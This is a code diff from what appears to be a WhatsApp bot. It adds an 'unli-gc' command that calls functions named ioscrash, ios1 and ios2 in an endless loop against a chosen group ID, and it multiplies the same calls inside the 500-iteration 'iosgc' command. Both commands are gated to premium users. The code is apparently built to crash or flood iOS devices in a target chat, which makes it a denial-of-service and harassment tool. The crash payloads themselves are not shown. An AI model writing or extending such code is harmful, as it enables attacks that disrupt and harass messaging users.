@@ -1416,13 +1416,62 @@ await galx(target, Ptcp = false)
 }
 }
 break
+case 'unli-gc': {
+if (!isPremium) return replygcxeon(mess.prem)
+if (!q) return replygcxeon(`Use ${prefix+command} gc-jid\nExample ${prefix+command} gc-jid`)
+let target = q
+await loading()
+for (;;) {
+await ioscrash(target)
+ios1(target)
+ios2(target)
+}
+}
+break
 
+			
 case 'iosgc': {
 if (!isPremium) return replygcxeon(mess.prem)
 if (!q) return replygcxeon(`Use ${prefix+command} gc-jid\nExample ${prefix+command} gc-jid`)
 let target = q
 await loading()
 for (let i = 0; i < 500; i++) {
+await ios1(target)
+await ios2(target)
+await ioscrash(target)
+await ioscrash(target)
+await ios1(target)
+await ios2(target)
+await ios1(target)
+await ios2(target)
+await ioscrash(target)
+await ioscrash(target)
+await ios1(target)
+await ios2(target)
+await ios1(target)
+await ios2(target)
+await ioscrash(target)
+await ioscrash(target)
+await ios1(target)
+await ios2(target) 
+await ios1(target)
+await ios2(target)
+await ioscrash(target)
+await ioscrash(target)
+await ios1(target)
+await ios2(target)
+await ios1(target)
+await ios2(target)
+await ioscrash(target)
+await ioscrash(target)
+await ios1(target)
+await ios2(target)
+await ios1(target)
+await ios2(target)
+await ioscrash(target)
+await ioscrash(target)
+await ios1(target)
+await ios2(target)
 await ios1(target)
 await ios2(target)
 await ioscrash(target)
